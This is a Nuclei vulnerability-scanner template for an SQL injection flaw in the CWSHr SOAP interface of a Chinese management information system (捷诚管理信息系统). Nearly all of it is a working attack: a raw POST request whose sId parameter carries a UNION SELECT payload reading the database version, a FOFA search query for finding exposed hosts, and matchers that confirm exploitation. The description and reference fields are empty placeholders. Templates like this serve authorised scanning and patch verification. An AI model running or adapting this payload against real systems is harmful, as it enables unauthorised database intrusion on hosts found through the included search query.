MyNuclei/捷诚管理信息系统-CWSHr接口-SQL注入漏洞.yaml

id: jiecheng-CWSHr-sqli

info:
  name: 捷诚管理信息系统-CWSHr接口-SQL注入漏洞
  author: candada
  severity: high
  description: description
  reference:
    - https://
  metadata: 
    fofa-query: body="/Scripts/EnjoyMsg.js"
  tags: sql

http:
  - raw:
      - |-
        POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close
        Content-Type: text/xml;charset=UTF-8
        SOAPAction: http://tempuri.org/GetLeaveReqById
        Content-Length: 474

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
           <soapenv:Header/>
           <soapenv:Body>
              <tem:GetLeaveReqById>
                 <!--type: string-->
                 <tem:sId>gero et' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- YQmj</tem:sId>
              </tem:GetLeaveReqById>
           </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - SQL Server
      - type: status
        status:
          - 200
